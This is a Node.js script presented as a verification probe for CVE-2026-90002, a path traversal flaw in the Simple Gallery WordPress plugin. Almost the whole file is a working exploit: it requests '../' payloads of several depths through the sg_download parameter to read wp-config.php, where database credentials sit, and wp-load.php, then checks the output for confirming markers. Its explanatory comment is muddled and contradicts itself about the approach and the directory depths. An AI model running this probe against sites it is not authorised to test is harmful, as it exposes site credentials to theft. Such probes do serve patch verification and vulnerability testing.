#!/usr/bin/env node
/**
 * Exploit-verification probe for CVE-2026-90002
 * Simple Gallery <= 2.0.0 - Unauthenticated Path Traversal to Arbitrary File Read
 * via the `sg_download` parameter.
 *
 * Usage: node probe.mjs <base-url>
 *
 * Exit code 0 => target IS exploitable (vulnerable).
 * Exit code 1 => target is NOT exploitable (appears fixed / not vulnerable).
 *
 * The probe only talks to the provided base URL. It performs read-only
 * GET requests and makes no persistent changes on the target.
 */

const baseUrl = process.argv[2];

if (!baseUrl) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

let origin;
try {
  origin = new URL(baseUrl).origin;
} catch (e) {
  console.error(`Invalid base URL: ${baseUrl}`);
  process.exit(1);
}

/**
 * Fetch a path relative to the target origin, returning the response text
 * (or null on network failure). Never follows cross-origin redirects.
 */
async function getText(path) {
  const url = origin + path;
  try {
    const res = await fetch(url, { redirect: 'manual' });
    const text = await res.text();
    return { status: res.status, text };
  } catch (e) {
    return null;
  }
}

async function main() {
  // The plugin exposes an uploads directory at wp-content/uploads/simple-gallery/
  // and serves files from it via ?sg_download=<filename>, relative to that
  // directory, with no sanitization against ../ sequences. A file that sits
  // one directory above the gallery dir (i.e. directly under uploads/) can be
  // reached via `../<filename>`. Since we don't know the exact filename of any
  // such file on an arbitrary target in advance, we instead confirm the
  // traversal primitive generically: requesting a path-traversal payload that
  // resolves to a well-known WordPress core file (wp-load.php, which always
  // exists in a standard WP install one or more levels above uploads) and
  // checking for its distinctive PHP source/leaked content, OR falling back
  // to wp-config.php markers if readable as plaintext (e.g. misconfigured
  // server). As a more robust and environment-agnostic check, we instead
  // verify the traversal by comparing behavior: a legitimate gallery file
  // request succeeds, while a traversal request to a known WordPress file
  // outside the gallery directory (which must NOT be reachable if patched)
  // also succeeds and returns recognizable WordPress file content.

  // Candidate traversal depths: the uploads dir structure is typically
  // wp-content/uploads/simple-gallery/, so wp-config.php sits 4 levels up.
  // We try a small range of depths to be robust to minor path layout
  // differences, and also attempt to read wp-load.php (always present, 4
  // levels up from a 2-level-deep plugin content dir) as a secondary check.
  const targets = [
    { name: 'wp-config.php', marker: /DB_NAME|define\(\s*'DB_/ },
    { name: 'wp-load.php', marker: /wp-blog-header|Bootstrap/ },
  ];

  let exploited = false;

  for (const target of targets) {
    for (let depth = 2; depth <= 6; depth++) {
      const traversal = '../'.repeat(depth) + target.name;
      const path = `/?sg_download=${encodeURIComponent(traversal).replace(/%2F/g, '/')}`;
      const result = await getText(path);
      if (!result) continue;
      if (result.status === 200 && target.marker.test(result.text)) {
        console.error(
          `[+] Path traversal confirmed: sg_download=${traversal} leaked ${target.name} contents.`
        );
        exploited = true;
        break;
      }
    }
    if (exploited) break;
  }

  if (!exploited) {
    console.error('[-] Could not confirm path traversal / arbitrary file read via sg_download.');
    process.exit(1);
  }

  process.exit(0);
}

main().catch((e) => {
  console.error('Probe error:', e);
  process.exit(1);
});
